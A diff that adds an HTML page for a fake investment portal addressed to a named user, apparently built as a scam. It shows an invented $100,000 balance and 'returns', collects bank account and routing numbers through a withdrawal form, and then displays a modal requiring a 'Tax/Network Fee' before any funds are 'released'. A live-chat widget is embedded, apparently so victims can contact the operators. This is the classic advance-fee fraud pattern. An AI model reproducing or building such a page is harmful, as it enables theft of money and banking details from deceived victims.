@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Global Investment Portal</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<link rel="stylesheet" href="style.css">
+</head>
+<body id="top">
+<!-- Header -->
+<nav class="navbar navbar-expand-lg navbar-dark">
+<div class="container">
+<a class="navbar-brand" href="#">
+<i class="fas fa-globe me-2"></i>Completed Payment Portal
+</a>
+<button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+<span class="navbar-toggler-icon"></span>
+</button>
+<div class="collapse navbar-collapse" id="navbarNav">
+<ul class="navbar-nav ms-auto">
+<li class="nav-item">
+<a class="nav-link active" href="#"><i class="fas fa-home me-1"></i> Dashboard</a>
+</li>
+
+<li class="nav-item">
+<a class="nav-link" href="#"><i class="fas fa-history me-1"></i> History</a>
+</li>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+
+<!-- Main Content -->
+<div class="container my-5">
+<!-- User Welcome Section -->
+<div class="user-welcome">
+<div class="user-avatar">DP</div>
+<div class="user-info">
+<h3>Welcome, Doretha Perry</h3>
+<p>Account Status: <span class="text-success">Verified</span></p>
+</div>
+</div>
+
+<!-- Dashboard Card -->
+<div class="dashboard-card">
+<h2 class="text-center mb-4">Dashboard</h2>
+
+<!-- Toggle Bar -->
+<div class="toggle-container">
+<span class="toggle-label">Show Detailed View</span>
+<label class="toggle-switch">
+<input type="checkbox" id="detailToggle">
+<span class="toggle-slider"></span>
+</label>
+</div>
+
+<!-- Balance Display -->
+<div class="text-center">
+<p class="text-muted mb-1">Your Total Balance</p>
+<div class="balance-display">$100,000</div>
+<p class="text-success"><i class="fas fa-arrow-up me-1"></i> +2.5% this month</p>
+</div>
+
+<!-- Investment Chart -->
+<div class="investment-chart">
+<div class="chart-line"></div>
+</div>
+
+<!-- Stats -->
+<div class="stats-container">
+<div class="stat-item">
+<div class="stat-value">$25,000</div>
+<div class="stat-label">Fee Paid</div>
+</div>
+<div class="stat-item">
+<div class="stat-value">$100,000</div>
+<div class="stat-label">Available</div>
+</div>
+<div class="stat-item">
+<div class="stat-value">89.8%</div>
+<div class="stat-label">Returns</div>
+</div>
+<div class="stat-item">
+<div class="stat-value">$75,000</div>
+<div class="stat-label">Earnings</div>
+</div>
+</div>
+
+<!-- Recent Transactions -->
+<div class="recent-transactions">
+<h5>Recent Transactions</h5>
+<div class="transaction-item">
+<div class="transaction-icon" style="background-color: var(--success-color);">
+<i class="fas fa-arrow-down"></i>
+</div>
+<div class="transaction-details">
+<p class="transaction-name">Bank Transfer</p>
+<p class="transaction-date">June 30, 2025</p>
+</div>
+<div class="transaction-amount positive">+$30,000</div>
+</div>
+<div class="transaction-item">
+<div class="transaction-icon" style="background-color: var(--warning-color);">
+<i class="fas fa-arrow-down"></i>
+</div>
+<div class="transaction-details">
+<p class="transaction-name">ACH Transfer</p>
+<p class="transaction-date">July 14, 2025</p>
+</div>
+<div class="transaction-amount positive">+$45,000</div>
+</div>
+<div class="transaction-item">
+<div class="transaction-icon" style="background-color: var(--success-color);">
+<i class="fas fa-arrow-down"></i>
+</div>
+<div class="transaction-details">
+<p class="transaction-name">Direct Deposit</p>
+<p class="transaction-date">November 1, 2025</p>
+</div>
+<div class="transaction-amount positive">+$25,000</div>
+</div>
+</div>
+
+<!-- Action Buttons -->
+<div class="action-buttons">
+<button class="btn action-btn btn-send">
+<i class="fas fa-paper-plane"></i> Send
+</button>
+<button class="btn action-btn btn-receive">
+<i class="fas fa-download"></i> Receive
+</button>
+<button class="btn action-btn btn-withdraw justify-content-center" id="withdrawBtn">
+<i class="fas fa-money-bill-wave"></i> Withdraw
+</button>
+</div>
+</div>
+
+<!-- Withdrawal Form (Initially Hidden) -->
+<div class="withdrawal-form" id="withdrawalForm" style="display: none;">
+<h3 class="mb-4">Withdrawal Request</h3>
+<form id="withdrawalRequestForm">
+<div class="row">
+<div class="col-md-6 mb-3">
+<label for="fullName" class="form-label">Full Name</label>
+<input type="text" class="form-control" id="fullName" value="Doretha Perry" required>
+</div>
+<div class="col-md-6 mb-3">
+<label for="bankName" class="form-label">Bank Name</label>
+<input type="text" class="form-control" id="bankName" placeholder="Enter your bank name" required>
+</div>
+</div>
+<div class="row">
+<div class="col-md-6 mb-3">
+<label for="accountNumber" class="form-label">Account Number</label>
+<input type="text" class="form-control" id="accountNumber" placeholder="Enter account number" required>
+</div>
+<div class="col-md-6 mb-3">
+<label for="routingNumber" class="form-label">Routing Number</label>
+<input type="text" class="form-control" id="routingNumber" placeholder="Enter routing number" required>
+</div>
+</div>
+<div class="mb-4">
+<label for="swiftCode" class="form-label">ZIP Code</label>
+<input type="text" class="form-control" id="swiftCode" placeholder="Enter ZIP code" required>
+</div>
+<div class="mb-4">
+<label for="withdrawalAmount" class="form-label">Withdrawal Amount</label>
+<div class="input-group">
+<span class="input-group-text">$</span>
+<input type="number" class="form-control" id="withdrawalAmount" value="100000" required>
+</div>
+<div class="form-text">Available balance: $100,000</div>
+</div>
+<div class="d-flex justify-content-end gap-2">
+<button type="button" class="btn btn-secondary" id="cancelWithdrawal">Cancel</button>
+<button type="submit" class="btn btn-primary">Submit Request</button>
+</div>
+</form>
+</div>
+</div>
+
+<!-- Withdrawal Confirmation Modal -->
+<div class="modal fade" id="withdrawalModal" tabindex="-1">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title">Withdrawal Confirmation</h5>
+<button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+</div>
+<div class="modal-body text-center">
+<i class="fas fa-exclamation-circle fa-3x text-warning mb-3"></i>
+<p>You've initiated a withdrawal of your balance.</p>
+<p>To receive it in your bank, you are required to complete the Tax/Network Fee. </p>
+<div class="fee-info mt-4">
+<div class="fee-label"><b>STATUS:</b></div>
+</div>
+<div class="fee-amount">PENDING</div>
+<p class="text-muted">Once the fee is paid, your funds will be released immediately in your bank.</p>
+</div>
+<div class="modal-footer justify-content-center">
+<button type="button" class="btn btn-cancel" data-bs-dismiss="modal">Cancel</button>
+<a href="#" class="btn btn-confirm" data-bs-dismiss="modal">OK</a>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Bootstrap JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+<!-- Begin of Chaport Live Chat code --> 
+     <script type="text/javascript"> (function(w,d,v3)
+     { w.chaportConfig = { appId : '68e4d894bbfc6e52647a9901', };  
+     if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document); 
+     </script>
+      <!-- End of Chaport Live Chat code -->
+
+
+<!-- Custom JavaScript -->
+<script src="script.js"></script>
+</body>
+</html>
